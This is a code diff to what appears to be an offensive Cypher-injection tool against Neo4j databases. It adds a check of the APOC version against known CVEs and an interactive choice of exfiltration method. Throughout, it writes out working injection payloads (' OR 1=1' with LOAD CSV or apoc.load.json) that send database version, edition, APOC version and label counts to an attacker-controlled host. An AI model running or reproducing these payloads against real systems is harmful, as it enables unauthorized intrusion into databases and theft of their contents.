@@ -84,7 +84,39 @@ def fully_dynamic_convert_data(original_data):
 
     return converted_data
 
+def check_vulnerability(apoc_version):
+    """
+    Checks if the given version is affected by any of the vulnerabilities.
 
+    Parameters:
+    - version_to_check (str): The version of APOC to check.
+    - vulnerability_data (dict): A dictionary containing vulnerability information.
+    (0, "version") 0: lower bound
+    """
+    vulnerability_data = {
+        "CVE-2021-42767: Path traversal in several apoc.* functions": [("0", "3.5.0.17"), ("0", "4.2.0.10"), ("0", "4.3.0.4"), ("0", "4.4.0.1")],
+        "CVE-2022-37423: Partial Path Traversal Vulnerability": [("0", "4.4.0.8"), ("0", "4.3.0.7"), ("0", "4.2.0.12"), ("0", "4.1.0.12"), ("0", "3.5.0.20")],
+        "CVE-2022-23532: Path Traversal Vulnerability": [("0", "4.3.0.12"), ("0", "4.4.0.12")],
+        "CVE-2023-23926: XML External Entity (XXE) vulnerability in apoc.import.graphml": [("0", "4.4.0.14")]
+    }
+    affected_advisories = []
+    counter = 0
+    current_version = version.parse(apoc_version)
+    for advisory, affected_ranges in vulnerability_data.items():
+        for lower, upper in affected_ranges:
+            if version.parse(lower) <= current_version < version.parse(upper):
+                affected_advisories.append(advisory)
+                counter += 1
+                break  # Stop checking other ranges for this advisory if already found affected
+
+    if affected_advisories:
+        print(f"\nAPOC Version {apoc_version} is affected by these vulnerabilities [{counter}]:")
+        for advisory in affected_advisories:
+            print(f"[*] {advisory}")
+    else:
+        print(f"APOC Version {apoc_version} is not affected by the known vulnerabilities.")
+
+    
 
 class RequestHandler(BaseHTTPRequestHandler):
     """Handles HTTP GET requests."""
@@ -190,11 +222,10 @@ class Neo4jInjector:
     def exfil_data(self):
 
         print("\n[*] APOC Check [*]")
-        self.inject_payload(f" OR 1=1 WITH 1 as a CALL apoc.load.json('{self.exfil_ip}/?apoc_installed=True') YIELD value RETURN value//")
+        self.inject_payload(f" OR 1=1 WITH 1 as a CALL apoc.load.json('{self.exfil_ip}/?apoc_version=' + apoc.version()) YIELD value RETURN value//")
         apoc_installed = True
         if data_queue.empty():
             parsed_data = {'apoc_installed': 'False'}
-            nested_dict = {'-': parsed_data}
             apoc_installed = False
         else:
             data = data_queue.get()  # Retrieve the next item from the queue
@@ -204,22 +235,25 @@ class Neo4jInjector:
         convert_dict_to_table(nested_dict)
 
         if apoc_installed:
-            return True
+            apoc_version = parsed_data['apoc_version']
+            check_vulnerability(apoc_version)
+            option = input("\nUse APOC to exfiltrate? (Y|N): ").lower()
+            if option == "y":
+                return True
+            elif option == "n":
+                print("\n[*] Continuing with LOAD CSV [*]")
+       
+
 
 
         print("\n[*] Version Check [*]")
-        self.inject_payload(f" OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version WITH DISTINCT name,version,edition LOAD CSV FROM '{self.exfil_ip}/?version=' + version + '&name=' + replace(name,' ','') + '&edition=' + edition as l RETURN 0 as _0//")
+        self.inject_payload(f" OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version WITH DISTINCT name,version,edition LOAD CSV FROM '{self.exfil_ip}/?neo4j_version=' + version + '&name=' + replace(name,' ','') + '&edition=' + edition as l RETURN 0 as _0//")
 
         data = data_queue.get()  # Retrieve the next item from the queue
         parsed_data = extract_query_params(data)  # Use the previously defined function
         nested_dict = {'-': parsed_data}
         convert_dict_to_table(nested_dict)
 
-        # version = parsed_data.get("version")
-        # if version.parse(given_version) >= version.parse("5.0"):
-        #     print(f"Version {given_version} is greater than or equal to 5.0")
-        # else:
-        #     print(f"Version {given_version} is less than 5.0"
 
         # dump label count
         self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH COUNT(DISTINCT label) as l LOAD CSV FROM '{self.exfil_ip}/?label_count='+l as x RETURN 0 as _0 //")
@@ -281,6 +315,16 @@ class Neo4jInjector:
 
     def apoc_exfil_data(self):
         print("\n[*] Using APOC to Exfiltrate [*]")
+
+        print("\n[*] Version Check [*]")
+        self.inject_payload(f" OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version WITH DISTINCT name,version,edition CALL apoc.load.json('{self.exfil_ip}/?neo4j_version='+version + '&name=' + replace(name,' ','') + 'edition=' + edition + '&apoc_version=' + apoc.version()) YIELD value RETURN value//")
+
+        data = data_queue.get()  # Retrieve the next item from the queue
+        parsed_data = extract_query_params(data)  # Use the previously defined function
+        nested_dict = {'-': parsed_data}
+        convert_dict_to_table(nested_dict)
+
+
 
         # dump label count
         self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH COUNT(DISTINCT label) as l CALL apoc.load.json('{self.exfil_ip}/?label_count='+l) YIELD value RETURN value//")
